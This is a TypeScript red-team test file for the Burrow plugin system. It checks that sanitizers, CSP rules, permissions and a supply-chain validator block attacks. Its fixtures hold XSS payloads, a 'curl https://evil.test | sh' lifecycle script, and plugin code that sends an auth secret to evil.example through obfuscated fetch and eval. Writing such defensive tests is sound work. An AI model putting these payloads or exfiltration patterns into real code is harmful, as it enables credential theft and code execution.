import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import Database from 'better-sqlite3';
import { Hono } from 'hono';
import { afterEach, describe, expect, it, vi } from 'vitest';
import {
  sanitizePluginHtml,
  sanitizePluginProps,
  type BurrowServerPlugin,
  type BurrowWebPlugin,
} from '@burrow/sdk';
import { createCoreApp } from '../../src/core/app';
import { SelfHostedPolicy } from '../../src/core/policy';
import { createPluginDb } from '../../src/core/plugins/plugin-db';
import { runPluginMigrations } from '../../src/core/plugins/migrations';
import { validatePluginManifest } from '../../src/core/plugins/manifest';
import { sortPluginsByDependencies } from '../../src/core/plugins/loader';
import { buildWebPluginRegistry } from '../../src/web/plugins/registry';
import { validatePluginDirectory } from '../../scripts/plugin-validate.mjs';

const tmpDirs: string[] = [];

function makeTempDir(prefix = 'burrow-redteam-misc-') {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  tmpDirs.push(dir);
  return dir;
}

afterEach(() => {
  for (const dir of tmpDirs.splice(0)) {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

describe('Category 6, 10, 11, 12 — XSS/UI, Manifest/Loader, Resource Abuse & Supply Chain', () => {
  describe('Category 6 — XSS, Sanitizer Bypasses, CSP Weakening & Web Slots', () => {
    it('strips protocol-relative //evil.com hrefs in sanitizePluginHtml', () => {
      const out = sanitizePluginHtml('<a href="//evil.example/phish">Click</a>');
      expect(out).not.toContain('//evil.example');
    });

    it('strips malformed </script > closing tags, iframe/object/embed/style, entity-encoded javascript:, and unsafe action/formaction/deep props in sanitizePluginProps', () => {
      // Closing tag with trailing space bypasses /<\/script>/gi
      const scriptSpace = sanitizePluginProps('<script>alert(1)</script >');
      expect(scriptSpace.toLowerCase()).not.toContain('<script');

      // Non-script HTML elements without on* attributes pass through sanitizePluginProps
      const iframe = sanitizePluginProps('<iframe src="javascript:alert(1)"></iframe>');
      expect(iframe.toLowerCase()).not.toContain('<iframe');

      const styleTag = sanitizePluginProps('<style>body{background:url(https://evil.test/x)}</style>');
      expect(styleTag.toLowerCase()).not.toContain('<style');

      // HTML-entity encoded URI scheme bypasses javascript: check
      const entityJs = sanitizePluginProps('javascript&#58;alert(1)');
      expect(entityJs).toBe('');

      // Deeply nested prop (> depth 6) fails open without sanitization
      const deep = { a: { b: { c: { d: { e: { f: { g: { url: 'javascript:alert(1)' } } } } } } } };
      const sanitizedDeep = sanitizePluginProps(deep);
      expect(sanitizedDeep.a.b.c.d.e.f.g.url).not.toBe('javascript:alert(1)');

      // Non-url keys like formaction or action are not checked by isSafeHref
      const formAction = sanitizePluginProps({ action: 'javascript:alert(1)' });
      expect(formAction.action).not.toBe('javascript:alert(1)');
    });

    it('blocks plugins from setting a weakened CSP header without unsafe-inline or wildcard', async () => {
      const dir = makeTempDir();
      const sqlite = new Database(path.join(dir, 'csp.sqlite'));
      try {
        const plugin: BurrowServerPlugin = {
          manifest: {
            id: 'csp-weak',
            version: '0.1.0',
            sdkVersion: '^0.4.0',
            permissions: ['routes:public'],
          },
          setup(ctx) {
            const r = new Hono();
            r.get('/page', (c) => {
              // Omits unsafe-inline, unsafe-eval, and '*' so loader's regex keeps it!
              c.header('Content-Security-Policy', "script-src 'self' https://evil.example data:");
              return c.text('ok');
            });
            ctx.route(r, { public: true });
          },
        };

        const app = createCoreApp(
          {
            repositories: { workspaces: { listByUser: async () => [], count: async () => 0 } as any, members: {} as any } as any,
            storage: {} as any,
            search: {} as any,
            locks: {} as any,
            auth: { getSession: async () => null, handler: async () => new Response('ok') },
            email: { provider: 'console', send: async () => {} },
            bootstrapToken: '',
            env: {},
          },
          { policy: new SelfHostedPolicy(), plugins: [plugin], rawDb: sqlite },
        );

        const res = await app.request('http://localhost/api/plugins/csp-weak/page');
        const csp = res.headers.get('Content-Security-Policy') ?? '';
        const scriptSrc =
          csp
            .split(';')
            .map((d) => d.trim())
            .find((d) => d.startsWith('script-src')) ?? '';
        expect(csp).not.toContain('https://evil.example');
        expect(scriptSrc).toBe("script-src 'self'");
        expect(scriptSrc).not.toContain('data:');
      } finally {
        sqlite.close();
      }
    });

    it('enforces cards:register permission in buildWebPluginRegistry', () => {
      const sneakWeb: BurrowWebPlugin = {
        manifest: {
          id: 'sneaky-cards',
          version: '0.1.0',
          sdkVersion: '^0.4.0',
          permissions: ['ui:register'], // intentionally omits 'cards:register'
        },
        cardTypes: [{ type: 'evil-card', label: 'Evil Card' }],
      };
      expect(() => buildWebPluginRegistry([sneakWeb])).toThrow(/cards:register/);
    });

    it('blocks dangerous tags, inline event handlers, and javascript: URIs in sanitizePluginHtml (passed)', () => {
      const xss = sanitizePluginHtml(
        '<p>Hi</p><script>alert(1)</script><svg onload="alert(1)"></svg><img src=x onerror=alert(1)><a href="javascript:alert(1)" onclick="alert(2)">link</a>',
      );
      expect(xss).toContain('<p>Hi</p>');
      expect(xss.toLowerCase()).not.toContain('<script');
      expect(xss.toLowerCase()).not.toContain('<svg');
      expect(xss.toLowerCase()).not.toContain('onerror');
      expect(xss.toLowerCase()).not.toContain('onclick');
      expect(xss.toLowerCase()).not.toContain('javascript:');
    });
  });

  describe('Category 10 & 11 — Manifest, Permission Lying, Resource Limits & Kill-Switch', () => {
    it('requires db:own permission before running plugin migrations', async () => {
      const dir = makeTempDir();
      const sqlite = new Database(path.join(dir, 'mig-perm.sqlite'));
      try {
        const noDbPermPlugin: BurrowServerPlugin = {
          manifest: {
            id: 'no-db-perm',
            version: '0.1.0',
            sdkVersion: '^0.4.0',
            permissions: [], // does NOT declare db:own!
          },
          migrations: [
            {
              name: '0001_sneaky.sql',
              sql: 'CREATE TABLE IF NOT EXISTS plugin_no_db_perm_t (id TEXT PRIMARY KEY)',
            },
          ],
          setup() {},
        };

        await expect(runPluginMigrations(sqlite, [noDbPermPlugin])).rejects.toThrow(/db:own/);
      } finally {
        sqlite.close();
      }
    });

    it('clamps PluginDb options.timeoutMs so a plugin cannot pass 24-day timeout', async () => {
      const dir = makeTempDir();
      const sqlite = new Database(path.join(dir, 'timeout.sqlite'));
      try {
        sqlite.exec('CREATE TABLE plugin_to_t (id TEXT PRIMARY KEY)');
        const db = createPluginDb(sqlite, 'to');
        const timeoutSpy = vi.spyOn(globalThis, 'setTimeout');
        try {
          await db.query('SELECT id FROM plugin_to_t', [], { timeoutMs: 2_147_483_647 });
          const delays = timeoutSpy.mock.calls.map((c) => Number(c[1] ?? 0));
          expect(Math.max(0, ...delays)).toBeLessThanOrEqual(30_000);
        } finally {
          timeoutSpy.mockRestore();
        }
      } finally {
        sqlite.close();
      }
    });

    it('enforces a timeout on PluginDb.batch() just like query/first/execute', async () => {
      const slowClient = {
        unsafe: () => new Promise<never>(() => {}),
        begin: async (cb: (tx: any) => Promise<any>) =>
          cb({ unsafe: () => new Promise<never>(() => {}) }),
      };
      const db = createPluginDb(slowClient, 'batch-to');
      const timeoutSpy = vi.spyOn(globalThis, 'setTimeout');
      try {
        // Start batch with a non-resolving mock; check whether batch sets a timeout timer at all
        const pending = db.batch([{ sql: 'INSERT INTO plugin_batch_to_t (id) VALUES (?)', params: ['1'] }]);
        await Promise.resolve();
        expect(timeoutSpy).toHaveBeenCalled();
        void pending;
      } finally {
        timeoutSpy.mockRestore();
      }
    });

    it('prevents kill-switched plugins (PLUGINS_DISABLED) from running migrations, setup(), or adapter overrides', async () => {
      const dir = makeTempDir();
      const sqlite = new Database(path.join(dir, 'killswitch.sqlite'));
      try {
        let setupRan = false;
        let rogueAuthCalled = false;
        const killSwitchedPlugin: BurrowServerPlugin = {
          manifest: {
            id: 'killed-plug',
            version: '0.1.0',
            sdkVersion: '^0.4.0',
            permissions: ['auth:override', 'db:own'],
          },
          migrations: [
            {
              name: '0001_init.sql',
              sql: 'CREATE TABLE IF NOT EXISTS plugin_killed_plug_t (id TEXT PRIMARY KEY)',
            },
          ],
          setup(ctx) {
            setupRan = true;
            ctx.setAdapters({
              auth: {
                getSession: async () => {
                  rogueAuthCalled = true;
                  return { userId: 'hijacked' };
                },
                handler: async () => new Response('hijacked'),
              },
            });
          },
        };

        const app = createCoreApp(
          {
            repositories: { workspaces: { listByUser: async () => [], count: async () => 0 } as any, members: {} as any } as any,
            storage: {} as any,
            search: {} as any,
            locks: {} as any,
            auth: { getSession: async () => null, handler: async () => new Response('ok') },
            email: { provider: 'console', send: async () => {} },
            bootstrapToken: '',
            env: { PLUGINS_DISABLED: 'killed-plug' },
          },
          { policy: new SelfHostedPolicy(), plugins: [killSwitchedPlugin], rawDb: sqlite },
        );

        await app.request('http://localhost/api/account');
        expect(setupRan).toBe(false);
        expect(rogueAuthCalled).toBe(false);
      } finally {
        sqlite.close();
      }
    });

    it('rejects unbounded/oversized plugin manifests (e.g. multi-MB description DoS)', () => {
      expect(() =>
        validatePluginManifest({
          id: 'giant-manifest',
          version: '0.1.0',
          sdkVersion: '^0.4.0',
          permissions: [],
          description: 'A'.repeat(200_000),
        }),
      ).toThrow();
    });

    it('blocks cyclic dependsOn and duplicate plugin ids in loader (passed)', () => {
      const pA: BurrowServerPlugin = {
        manifest: { id: 'cyc-a', version: '0.1.0', sdkVersion: '^0.4.0', permissions: [], dependencies: ['cyc-b'] },
        setup() {},
      };
      const pB: BurrowServerPlugin = {
        manifest: { id: 'cyc-b', version: '0.1.0', sdkVersion: '^0.4.0', permissions: [], dependencies: ['cyc-a'] },
        setup() {},
      };
      expect(() => sortPluginsByDependencies([pA, pB])).toThrow(/Circular plugin dependency/i);
      expect(() => sortPluginsByDependencies([pA, pA])).toThrow(/Duplicate plugin id/i);
    });
  });

  describe('Category 12 — Supply-Chain & plugin:validate Bypasses', () => {
    it('blocks preprepare/postprepare/prepack lifecycle scripts and pkg.bin entries', () => {
      const dir = makeTempDir('burrow-redteam-sc-');
      fs.writeFileSync(
        path.join(dir, 'package.json'),
        JSON.stringify({
          name: 'evil-lifecycle-plugin',
          version: '1.0.0',
          license: 'MIT',
          scripts: {
            preprepare: 'node evil.cjs',
            prepack: 'curl https://evil.test | sh',
          },
          bin: { pnpm: './evil.cjs' },
        }),
      );
      const res = validatePluginDirectory(dir, { requireLockfile: false });
      expect(res.ok).toBe(false);
    });

    it('blocks unverified file:.tgz tarball dependencies and devDependencies ranges/git URLs', () => {
      const dir = makeTempDir('burrow-redteam-sc-');
      fs.writeFileSync(
        path.join(dir, 'package.json'),
        JSON.stringify({
          name: 'evil-deps-plugin',
          version: '1.0.0',
          license: 'MIT',
          dependencies: {
            'local-backdoor': 'file:./evil.tgz',
          },
          devDependencies: {
            evil: 'git+https://evil.example/rce.git',
          },
        }),
      );
      fs.writeFileSync(path.join(dir, 'pnpm-lock.yaml'), ''); // 0-byte empty lockfile!
      const res = validatePluginDirectory(dir, { requireLockfile: true });
      expect(res.ok).toBe(false);
    });

    it('detects obfuscated eval, globalThis["fetch"], process env, .cjs files, and comment-tricked routes in plugin:validate', () => {
      const dir = makeTempDir('burrow-redteam-sc-');
      fs.writeFileSync(
        path.join(dir, 'package.json'),
        JSON.stringify({ name: 'obfuscated-plugin', version: '1.0.0', license: 'MIT' }),
      );
      fs.writeFileSync(
        path.join(dir, 'index.ts'),
        `
        // zValidator bypasses route check
        export function setup(ctx: any) {
          const p = process;
          const secret = p['e' + 'nv'].BETTER_AUTH_SECRET;
          const f = globalThis['fetch'];
          const run = (0, eval);
          run('1+1');
          f('https://evil.example', { method: 'POST', body: secret });
          const router: any = {};
          router.post('/unvalidated', (c: any) => c.req.json());
          ctx.route(router);
        }
        `,
      );
      fs.writeFileSync(
        path.join(dir, 'payload.cjs'),
        `const cp = require('child_process'); cp.execSync('whoami');`,
      );

      const res = validatePluginDirectory(dir, { requireLockfile: false });
      const rules = new Set(res.findings.map((f: { rule: string }) => f.rule));
      expect(rules.has('@burrow/no-unsafe-eval')).toBe(true);
      expect(rules.has('@burrow/no-raw-fetch')).toBe(true);
      expect(rules.has('@burrow/no-process-env')).toBe(true);
      expect(rules.has('unvalidated-route')).toBe(true);
      expect(res.findings.some((f: { file: string }) => f.file === 'payload.cjs')).toBe(true);
    });

    it('blocks basic unpinned ranges, git URLs, postinstall, and direct eval/child_process (passed)', () => {
      const dir = makeTempDir('burrow-redteam-sc-');
      fs.writeFileSync(
        path.join(dir, 'package.json'),
        JSON.stringify({
          name: 'blatant-bad',
          version: '1.0.0',
          license: 'GPL-3.0',
          scripts: { postinstall: 'echo pwn' },
          dependencies: {
            foo: '^1.0.0',
            bar: 'git+https://github.com/x/y.git',
          },
        }),
      );
      fs.writeFileSync(
        path.join(dir, 'index.ts'),
        `import { exec } from 'node:child_process'; eval('1'); exec('ls');`,
      );
      const res = validatePluginDirectory(dir, { requireLockfile: false });
      expect(res.ok).toBe(false);
      expect(res.findings.length).toBeGreaterThanOrEqual(5);
    });
  });
});
